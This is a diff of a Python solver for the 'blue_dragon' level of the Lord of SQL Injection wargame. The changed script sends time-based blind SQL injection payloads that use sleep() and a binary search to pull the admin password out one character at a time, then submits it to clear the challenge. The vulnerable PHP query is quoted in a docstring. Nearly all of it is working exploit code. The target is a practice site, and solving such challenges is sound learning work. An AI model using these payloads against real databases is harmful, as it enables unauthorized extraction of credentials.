@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
-    '''
+    """
     check time for request
     args[2]: time before request
     args[1]: time after request
-    '''
+    """
     return args[2] - args[1] > 4
 
 
 def main():
-    '''
+    """
     Blue_dragon 27
 
     Time-based Blind injection
@@ -30,37 +31,27 @@ def main():
     $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
     if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
+    other_param = {'id': 'admin'}
 
-    final_response = ''
-    while 'Clear!' not in final_response:
+    payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
+    p = los.SqlInjection(url, cook, method, inj_param, payload,
+                         other_param=other_param)
+    len_of_key = p.find_key_len(check_func)
 
-        payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
-        param = dict(pw=payload)
-        len_of_key = los.find_key_len(url, param, check_func, cook)
+    p.payload = f"' or id='admin' and if(ord(mid(pw,%d,1))<%s,sleep(5),0)#"
+    result = p.find_binary(check_func, len_of_key)
 
-        print(len_of_key)
+    p.payload = result
+    response = p.my_request()
 
-        result = ''
-        num_of_requests = 0
-        for i in range(1, len_of_key + 1):
-            payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(5),0)#"
-            param = dict(pw=payload)
-            left, num_requests = los.find_binary(url, param, check_func,
-                                                 32, 127, cook)
-            print(chr(left))
-            result += chr(left)
-            num_of_requests += num_requests
-
-        print('num_of_requests:', num_of_requests)
-
-        param = {'id': 'admin', 'pw': result}
-        final_response = los.get_request(url, param, cook)
-
-    print('Blue_dragon Clear!')
+    if 'Clear!' in response:
+        print('\nBlue_dragon Clear!')
 
 
 if __name__ == '__main__':
